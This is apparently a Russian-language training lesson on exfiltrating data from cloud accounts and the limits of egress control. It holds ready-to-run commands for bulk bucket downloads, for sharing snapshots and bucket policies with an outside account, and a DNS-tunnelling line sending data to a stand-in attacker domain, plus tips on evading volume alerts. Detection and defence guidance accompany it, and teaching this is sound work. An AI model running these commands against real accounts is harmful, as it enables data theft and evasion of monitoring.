---
id: cloud-exfiltration
title: "Эксфильтрация данных из облака и egress-контроль"
category: cloud
parent: cloud-defense-deep
difficulty: hard
order: 1
tags: [cloud, exfiltration, egress, snapshot, s3, data, dlp]
prerequisites: [cloud-defense-deep, cloud-storage-s3]
useful_for:
  - "Вывод данных из облачного аккаунта"
  - "Оценка egress-контроля"
  - "Понимание каналов утечки"
estimated_minutes: 50
summary: "Как выводят данные из облака: скачивание, снапшоты, шаринг, API, DNS, публичные бакеты. Как работает egress-контроль и какие техники его обходят или обходят не полностью."
---

## Зачем этот урок

Эксфильтрация — это финальная стадия большинства атак: данные нужно вынести из облака. В отличие от традиционной сети, в облаке есть **много легитимных каналов вывода**, которые защита не считает аномальными: скачивание из S3/Storage, публичные снапшоты, шаринг между аккаунтами, API-вызовы, отправка в очередь, email. Плюс egress-контроль часто настроен слабо или отсутствует. Этот урок — про каналы эксфильтрации, их заметность, обход egress-ограничений и то, как защита их детектит.

## Каналы эксфильтрации в облаке

1. **Прямое скачивание из объектного хранилища.** S3/Blob/GCS → локально. Простой, но заметный по объёму.
2. **Снапшоты и образы.** `ec2:ModifySnapshotAttribute` (share snapshot с внешним аккаунтом), AMI share, RDS snapshot share. Данные уходят «официально», без прямого скачивания.
3. **Шаринг ресурсов между аккаунтами.** S3 bucket policy, cross-account role, resource-based policy.
4. **API-вызовы.** `GetSecretValue`, `GetObject` через API, выгрузка в свой сервис.
5. **Очереди и события.** Запись в SQS/SNS/Event Hub, подписка на них с внешнего аккаунта.
6. **Email/SMS.** SES/SendGrid → внешний адрес.
7. **DNS-туннелирование.** Данные в DNS-запросах; медленно, но обходит egress по домену.
8. **ICMP/скрытые каналы.** Редко, но возможно при отсутствии фильтрации.
9. **Публичные бакеты.** Если вы можете сделать бакет публичным, данные «выложены» в интернет.
10. **Lambda/Function → внешний endpoint.** Функция с egress отправляет данные наружу.
11. **CDN/edge.** Через CloudFront/Cloudflare можно выводить данные, маскируя origin.
12. **Backup/vault.** Экспорт бэкапов (RDS, EBS, EFS) во внешний аккаунт.

Ключевое: egress-контроль (security groups, NAT, VPC endpoints, VPC-SC, Azure Firewall) ограничивает **сетевой** вывод, но не всегда блокирует **control-plane** операции (шаринг снапшота, bucket policy), которые выводят данные косвенно.

## Инструменты и команды

Скачивание:

```bash
aws s3 sync s3://target-bucket ./loot --quiet
rclone copy s3:target-bucket ./loot
azcopy copy 'https://acct.blob.core.windows.net/container?<SAS>' ./loot --recursive
gsutil -m cp -r gs://target-bucket ./loot
```

Шаринг снапшота EBS с внешним аккаунтом:

```bash
aws ec2 create-snapshot --volume-id vol-123 --description "backup"
aws ec2 modify-snapshot-attribute --snapshot-id snap-123 \
  --attribute createVolumePermission --operation-type add --user-ids 999999999999
# Теперь внешний аккаунт может создать том из снапшота и прочитать данные
```

RDS snapshot share:

```bash
aws rds modify-db-snapshot-attribute --db-snapshot-identifier my-snap \
  --attribute-name restore --values-to-add 999999999999
```

Bucket policy (cross-account):

```bash
aws s3api put-bucket-policy --bucket target-bucket --policy '{
  "Version":"2012-10-17","Statement":[{
    "Effect":"Allow","Principal":{"AWS":"arn:aws:iam::999999999999:root"},
    "Action":"s3:GetObject","Resource":"arn:aws:s3:::target-bucket/*"}]}'
```

## Разобранный пример: эксфильтрация через снапшот-шеринг

Сценарий: у вас есть креды с правами EC2, но egress ограничен (нет прямого интернета). Данные на EBS-томе.

Шаг 1 — создаём снапшот тома:

```bash
aws ec2 create-snapshot --volume-id vol-0abc --description "maintenance"
# {"SnapshotId":"snap-0def","State":"pending"}
aws ec2 wait snapshot-completed --snapshot-ids snap-0def
```

Шаг 2 — шарим снапшот с внешним (нашим) аккаунтом:

```bash
aws ec2 modify-snapshot-attribute --snapshot-id snap-0def \
  --attribute createVolumePermission --operation-type add --user-ids 111122223333
```

Шаг 3 — во внешнем аккаунте создаём том из снапшота и читаем данные:

```bash
# В нашем аккаунте
aws ec2 create-volume --availability-zone us-east-1a --snapshot-id snap-0def
aws ec2 attach-volume --volume-id vol-0ext --instance-id i-ourexfil --device /dev/sdf
# На нашем инстансе
mount /dev/nvme1n1 /mnt && cp -r /mnt/secret /loot
```

Шаг 4 — итог: данные вышли через **control-plane** операцию, минуя egress-фильтрацию сетевого уровня. Это ключевое преимущество техники.

Шаг 5 — заметность: `CreateSnapshot` и `ModifySnapshotAttribute` логируются в CloudTrail; GuardDuty имеет findings `Exfiltration:EC2/...`. Если снапшот шарится с аккаунтом вне организации — это сильный сигнал.

Аналогично для RDS (share snapshot) и AMI.

## Варианты атак и обходы

- **Snapshot/AMI/RDS share.** Обход egress через control-plane.
- **Cross-account bucket policy.** Прямой доступ к бакету из внешнего аккаунта.
- **Публичный бакет.** `PutBucketAcl`/`PutBucketPolicy` делают данные доступными из интернета.
- **DNS-туннель.** Обход egress-фильтра по IP, если DNS разрешён.
- **VPC endpoints.** Если есть endpoint для S3, данные идут по нему; можно выводить через внешний аккаунт.
- **Lambda с egress.** Функция может иметь доступ в интернет, даже если инстансы — нет.
- **SES/email.** Отправка данных на внешний адрес.
- **CloudFront/CDN.** Данные отдаются через edge, origin скрыт.
- **Backup-экспорт.** `StartExportTask` (RDS/Neptune) в S3, затем скачивание.
- **KMS-шифрование.** Если данные зашифрованы ключом, к которому у внешнего аккаунта нет доступа, снапшот бесполезен — проверяйте.

## Частые ошибки и подводные камни

- **Игнорировать control-plane.** Снапшот-шеринг обходит egress-контроль.
- **Забывать про шифрование.** Зашифрованный снапшот без доступа к ключу не даст данных.
- **Считать публичный бакет незаметным.** Смена ACL/policy логируется и алертится.
- **Не проверять cross-region.** Снапшот можно восстановить в другом регионе.
- **Путать egress-контроль и DLP.** DLP может инспектировать содержимое; egress — только направление.
- **Огромные объёмы.** Массивное скачивание триггерит алерты по объёму; дробите и замедляйте.

## Защита и детект

- **Egress-фильтрация.** SG/NSG/firewall + VPC endpoints; запрет произвольного выхода в интернет.
- **Блокировка снапшот-шеринга** через SCP/org policy: запрет `ModifySnapshotAttribute` с внешними аккаунтами.
- **Контроль bucket policy/ACL.** Запрет публичного доступа, `Block Public Access`.
- **Шифрование** данных и ключей; ограничение `kms:Decrypt`/`Grant`.
- **VPC-SC / PrivateLink** для изоляции сервисов.
- **DLP и Cloud DLP** для инспекции данных.
- **Детект.** GuardDuty `Exfiltration:*`, `Policy:S3/BucketBlockPublicAccessDisabled`; CloudTrail алерты на `ModifySnapshotAttribute`, `PutBucketPolicy`, `PutBucketAcl`, `StartExportTask`, cross-account `AssumeRole`. Аномалии объёма data transfer (CloudWatch/Network Watcher).
- **Мониторинг data transfer** и стоимости (всплеск egress — сигнал).

## Egress-контроль: как он устроен и что не покрывает

Egress-контроль ограничивает **исходящий** трафик из облачной сети:

- **AWS:** security groups (egress-правила), NACL (stateless), NAT Gateway, VPC endpoints (Gateway для S3/DynamoDB, Interface для остального), Network Firewall, SCP-условия на регионы.
- **Azure:** NSG-правила egress, Azure Firewall, service endpoints/private endpoints, route tables (UDR).
- **GCP:** firewall rules egress, Cloud NAT, Private Google Access, VPC Service Controls (perimeter).

Что egress-контроль **не** покрывает:

- **Control-plane операции.** Шаринг снапшота, изменение bucket policy, cross-account role — это API-вызовы, а не сетевой трафик; они обходят сетевую фильтрацию.
- **Разрешённые endpoints.** Если разрешён VPC endpoint для S3, данные можно вывести в другой аккаунт через него.
- **DNS.** Если DNS разрешён (а он почти всегда), возможен DNS-туннель.
- **Сервисы с собственным egress.** Lambda/Functions могут иметь свой сетевой путь.
- **Разрешённые домены/сервисы.** Если egress разрешён к определённым сервисам, через них можно выводить данные.

Поэтому «у нас закрыт egress» не означает «данные не утекут». Оценивая защиту, проверяйте и сетевые, и control-plane каналы. Для пентеста это подсказка: если прямой egress закрыт, ищите control-plane путь (снапшот/шаринг) или разрешённый канал.

## Практический чек-лист оценки эксфильтрации

1. Какие данные чувствительны (бакеты, тома, БД, секреты)?
2. Зашифрованы ли они и у кого есть ключи?
3. Открыт ли egress в интернет из затронутых подсетей?
4. Есть ли control-plane пути: снапшот-шеринг, cross-account policy, экспорт бэкапов?
5. Разрешены ли VPC endpoints и какие (можно ли через них вывести данные)?
6. Есть ли DLP/инспекция содержимого?
7. Какие каналы детектятся (GuardDuty `Exfiltration:*`, алерты по объёму)?
8. Есть ли cross-account доверия, которые можно использовать?
9. Ограничен ли размер/скорость передачи (rate limiting)?
10. Можно ли сделать данные публичными (bucket policy/ACL)?

Этот чек-лист помогает выбрать реальный канал и оценить заметность, а для blue team — закрыть дыры.

## Пример: эксфильтрация через DNS

DNS — недооценённый канал. Если egress-фильтр разрешает DNS (а он почти всегда разрешён, иначе не работает резолвинг), данные можно передавать в DNS-запросах:

1. **Подготовка.** Вы контролируете домен `exfil.attacker.tld` с авторитетным DNS-сервером, который логирует запросы.
2. **Кодирование.** Данные разбиваются на части, кодируются (base32/hex) и встраиваются в поддомены: `<chunk1>.exfil.attacker.tld`, `<chunk2>.exfil.attacker.tld`.
3. **Отправка.** Скомпрометированный ресурс делает DNS-запросы (`dig`/`nslookup`/резолвер). Каждый запрос несёт порцию данных.
4. **Сбор.** Ваш DNS-сервер собирает запросы и восстанавливает данные.

Пример изнутри облака (если разрешён только DNS):

```bash
# Отправка base32-фрагмента
DATA=$(echo -n "SECRETDATA" | base32 | tr -d '=')
dig +short "${DATA}.exfil.attacker.tld" @8.8.8.8
```

Ограничения: пропускная способность низкая, GuardDuty может детектить `Exfiltration:DNS` по аномальным DNS-запросам, некоторые среды фильтруют DNS по домену. Но если egress закрыт по IP, а DNS открыт — это рабочий канал. Для защиты: DNS-фильтрация, ограничение резолверов, детект длинных/энтропийных поддоменов.

## Итоговая мысль

Эксфильтрация в облаке многоканальна, и защита часто закрывает лишь сетевой путь, забывая про control-plane. Поэтому оценка всегда включает оба: сетевые каналы (скачивание, DNS, API) и control-plane (снапшоты, шаринг, policy). Выбор канала — компромисс между объёмом, скоростью и заметностью; для пентеста важнее доказать **возможность**, чем вывести все данные. Документируйте канал, объём и то, какая защита его не остановила, — это и есть результат.

## Что дальше / решение

Эксфильтрация в облаке — это не только «скачать файл». Control-plane каналы (снапшоты, шаринг, bucket policy) обходят egress-контроль и часто менее заметны, чем массовое скачивание. Начните с инвентаризации чувствительных данных (бакеты, тома, БД), проверьте шифрование и права на шаринг. Выберите канал с учётом egress-ограничений и заметности. Помните о ключах: зашифрованные данные без ключа бесполезны. Записывайте канал, объём и результат как отдельную находку; для заказчика это ключевая демонстрация риска.

## Квиз

```quiz
- question: "Почему снапшот-шеринг обходит egress-контроль?"
  options:
    - "Это control-plane операция, а не сетевой вывод данных"
    - "Он шифрует данные"
    - "Он быстрее"
    - "Он бесплатный"
  answer: 0
  explanation: "Данные выводятся через шаринг снапшота, минуя сетевую фильтрацию."
- question: "Что делает снапшот бесполезным для внешнего аккаунта?"
  options:
    - "Шифрование ключом, к которому нет доступа"
    - "Большой размер"
    - "Другой регион"
    - "Тип диска"
  answer: 0
  explanation: "Без доступа к KMS-ключу данные снапшота не прочитать."
- question: "Какой канал может обойти egress-фильтр по IP?"
  options:
    - "DNS-туннелирование"
    - "Прямое скачивание"
    - "S3 sync"
    - "HTTP GET"
  answer: 0
  explanation: "Если DNS разрешён, данные можно передавать в DNS-запросах."
- question: "Что детектит GuardDuty при эксфильтрации?"
  options:
    - "Findings категории Exfiltration (например, по снапшотам и S3)"
    - "Только пароли"
    - "Только DNS"
    - "Ничего"
  answer: 0
  explanation: "GuardDuty имеет findings Exfiltration для типовых каналов."
```

## Где пригодится

- **Red team:** вывод данных с учётом egress-контроля.
- **Пентест:** демонстрация риска утечки.
- **Blue team:** настройка egress-фильтрации и DLP.
- **IR:** обнаружение утечки и оценка объёма.
